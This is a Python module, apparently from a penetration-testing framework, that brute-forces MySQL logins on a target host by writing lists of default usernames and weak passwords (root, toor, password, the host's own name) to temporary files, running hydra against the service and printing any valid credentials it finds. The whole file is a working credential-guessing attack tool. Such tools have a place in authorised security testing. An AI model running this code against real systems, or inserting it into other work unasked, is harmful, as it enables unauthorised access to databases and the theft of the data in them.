from __future__ import print_function

import nmap
import subprocess
import tempfile
from fart.utils import *

def commonlogins(host, port, service, output_file, **kwargs):
    COMMON_USERS = [ 'root', 'toor', 'user', 'r00t' ]
    COMMON_PASS =  [ '', 'root', 'toor', 'password', 'r00t', 'Password1', '12345678', '?????' ]

    if 'hostname' in kwargs:
        hostname_first = kwargs['hostname'].split('.')[0]
        COMMON_USERS.append(hostname_first)
        COMMON_PASS.append(hostname_first)

    usernames_path = tempfile.mktemp()
    passwords_path = tempfile.mktemp()
    with open(usernames_path, 'w') as usernames_file:
        usernames_file.write('\n'.join(COMMON_USERS))
        usernames_file.write('\n')

    with open(passwords_path, 'w') as passwords_file:
        passwords_file.write('\n'.join(COMMON_PASS))
        passwords_file.write('\n')

    HYDRA = 'hydra -v -I -L {} -P {} -t4 mysql://{}:{} 2>/dev/null'.format(usernames_path, passwords_path, host, port)
    try:
        results, __ = execute_cmd(HYDRA)
        _results = results.split('\n')

        for line in _results:
            if 'login:' in line:
                user = line.split(' ')[6]
                pwd = line.split(' ')[10]
                print_green('[{}] Valid MYSQL credentials found: {}:{}'.format(host, user, pwd))

        with open(output_file, 'w') as output:
            output.write(results)
    except Exception as e:
        print_red('Error during hydra (mysql): {}'.format(HYDRA))
        print_red('Error message: {}'.format(e))

    os.unlink(usernames_path)
    os.unlink(passwords_path)
